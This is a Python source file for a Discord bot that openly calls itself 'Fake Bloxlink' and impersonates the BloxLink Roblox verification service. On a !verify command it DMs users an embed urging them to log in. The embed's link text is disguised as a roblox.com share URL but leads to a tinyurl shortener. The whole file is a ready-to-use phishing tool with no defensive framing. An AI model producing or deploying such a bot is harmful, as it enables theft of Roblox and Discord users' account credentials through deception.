import discord
from discord.ext import commands

intents = discord.Intents.all()

# Settings (Change these to whatever you want)
token = "1715"
prefix = "!"
title = "Please Complete Verification"
desc = "To verify your account, please join BloxLink's Official Roblox Verification Game"
field = "Please Login and join the game!"
hyperlink = "SEEMINGLY_REAL_LINK"
fake_link = "[https//www.roblox.com/share?code=26060ea909726140825b51c47c6897c7&type=Server](https://tinyurl.com/27x9peyn)"

client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command('help')

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('Fake Bloxlink is Online!')
    print('----------------')

main = discord.Embed(title=title, description=desc, color=0xcf4948)
main.add_field(name=field, value=f"[{hyperlink}]({fake_link})")
main.set_thumbnail(url='https://avatars.githubusercontent.com/u/39774496?s=200&v=4')

@client.command()
async def verify(ctx):
    await ctx.send('Sent Verification Link! Please Check DMs')
    await ctx.author.send(embed=main)

client.run(token)
